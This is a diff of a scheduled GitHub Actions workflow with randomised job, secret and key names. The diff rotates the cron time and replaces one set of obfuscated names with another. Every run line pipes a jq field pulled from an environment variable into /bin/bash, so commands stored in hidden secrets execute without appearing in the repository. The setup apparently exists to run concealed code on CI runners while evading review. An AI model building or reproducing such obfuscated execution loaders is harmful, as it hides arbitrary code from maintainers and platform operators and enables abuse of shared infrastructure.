@@ -2,8 +2,7 @@ name: gantingxi3810
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 2/6 * * *'
-
+    - cron: '45 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: gantingxi3810
         env:
-          rkhz1: ${{ secrets.rkhz1 }}
+          uiv44: ${{ secrets.uiv44 }}
         run: |
-          echo $rkhz1 | jq -r .v782 | /bin/bash
-          echo $m3651 | jq -r .jzs210 | /bin/bash
-          echo $m392 | jq -r .qhieu7053 | /bin/bash
-          echo $z1393 | jq -r .expt00 | /bin/bash
-          echo $l29797 | jq -r .v8 | /bin/bash
-          echo $k26 | jq -r .kvq5 | /bin/bash
-          echo $syy12961 | jq -r .yk3634 | /bin/bash
-          echo $ymu67929 | jq -r .rcgz6 | /bin/bash
+          echo $uiv44 | jq -r .ml0 | /bin/bash
+          echo $ymt31 | jq -r .lk6 | /bin/bash
+          echo $is23749 | jq -r .sx7 | /bin/bash
+          echo $blpd37484 | jq -r .lah0 | /bin/bash
+          echo $rrh626 | jq -r .l89 | /bin/bash
+          echo $h3 | jq -r .uly3934 | /bin/bash
+          echo $q93 | jq -r .ieo94 | /bin/bash
 
